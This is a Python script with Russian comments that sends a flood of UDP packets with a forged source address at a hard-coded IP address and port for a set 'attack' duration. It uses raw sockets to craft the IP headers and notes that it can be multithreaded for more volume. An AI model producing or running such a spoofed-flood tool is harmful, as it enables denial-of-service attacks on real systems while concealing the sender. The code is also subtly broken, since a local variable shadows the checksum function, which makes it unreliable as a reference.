#!/usr/bin/env python3
import socket
import random
import time
import struct
import sys

# ===== НАСТРОЙКИ =====
TARGET_IP = "69.46.46.125"
TARGET_PORT = 8080
SOURCE_IP = "1.2.3.4"          # Поддельный IP (можно случайный)
INTERFACE = "ens6"             # Твой интерфейс (из ip a)
THREADS = 1                    # Для теста оставляем 1, потом увеличим
PACKET_SIZE = 512              # Размер полезной нагрузки
DURATION = 60                  # Секунд атаки
# =====================

def checksum(data):
    """Вычисление IP-контрольной суммы (16 бит)"""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_ip_header(src_ip, dst_ip, proto, payload_len):
    """Создаёт IP-заголовок с корректной контрольной суммой"""
    ip_ver_ihl = 0x45          # IPv4, длина заголовка 5 слов (20 байт)
    tos = 0
    total_len = 20 + payload_len
    ip_id = random.randint(0, 65535)
    flags_frag = 0
    ttl = 64
    protocol = proto
    checksum = 0               # сначала 0, потом пересчитаем
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    # Упаковываем заголовок без контрольной суммы
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, tos, total_len, ip_id, flags_frag,
        ttl, protocol, checksum, src, dst
    )
    # Вычисляем контрольную сумму
    ip_checksum = checksum(ip_header)
    # Переупаковываем с правильной контрольной суммой
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, tos, total_len, ip_id, flags_frag,
        ttl, protocol, ip_checksum, src, dst
    )
    return ip_header

def create_udp_header(src_port, dst_port, payload_len):
    """Создаёт UDP-заголовок (без контрольной суммы, её можно не считать)"""
    udp_len = 8 + payload_len
    return struct.pack('!HHHH', src_port, dst_port, udp_len, 0)

def send_spoofed_packets():
    """Отправляет пакеты с подменённым source IP"""
    try:
        # Создаём raw-сокет
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        # Привязываем к интерфейсу (важно для маршрутизации)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, INTERFACE.encode())
        # Увеличиваем буфер отправки
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    except PermissionError:
        print("❌ Запусти скрипт с sudo!")
        sys.exit(1)
    except OSError as e:
        print(f"❌ Ошибка сокета: {e}. Проверь интерфейс {INTERFACE}")
        sys.exit(1)

    end_time = time.time() + DURATION
    packet_count = 0
    print(f"🚀 Запуск спуфинга на {TARGET_IP}:{TARGET_PORT} с source {SOURCE_IP}")
    
    while time.time() < end_time:
        # Генерируем случайный source port
        src_port = random.randint(10000, 65535)
        payload = random.randbytes(PACKET_SIZE)
        
        ip_header = create_ip_header(SOURCE_IP, TARGET_IP, socket.IPPROTO_UDP, len(payload))
        udp_header = create_udp_header(src_port, TARGET_PORT, len(payload))
        packet = ip_header + udp_header + payload
        
        try:
            sock.sendto(packet, (TARGET_IP, 0))
            packet_count += 1
        except OSError as e:
            print(f"⚠️ Ошибка отправки: {e}")
            break
        
        # Небольшая задержка, чтобы не перегружать CPU (можно убрать)
        # time.sleep(0.00001)
    
    print(f"✅ Отправлено {packet_count} пакетов за {DURATION} сек")

if __name__ == "__main__":
    # Для многопоточности можно раскомментировать:
    # import threading
    # threads = []
    # for _ in range(THREADS):
    #     t = threading.Thread(target=send_spoofed_packets)
    #     t.start()
    #     threads.append(t)
    # for t in threads:
    #     t.join()
    send_spoofed_packets()
